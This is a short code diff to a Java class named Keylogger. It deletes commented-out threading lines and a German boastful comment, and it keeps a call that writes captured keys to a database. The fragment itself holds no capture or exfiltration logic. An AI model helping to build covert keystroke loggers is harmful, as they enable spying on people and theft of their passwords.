@@ -56,9 +56,6 @@ public class Keylogger {
 			e.printStackTrace();
             System.exit(1);
 		}
-        //Thread t = new Thread(() -> writeToDB(keylistener));
-		//t.start();
-
         writeToDB(keylistener);
     }
-}// ich bin der beste Programmierer auf dieser Welt
+}
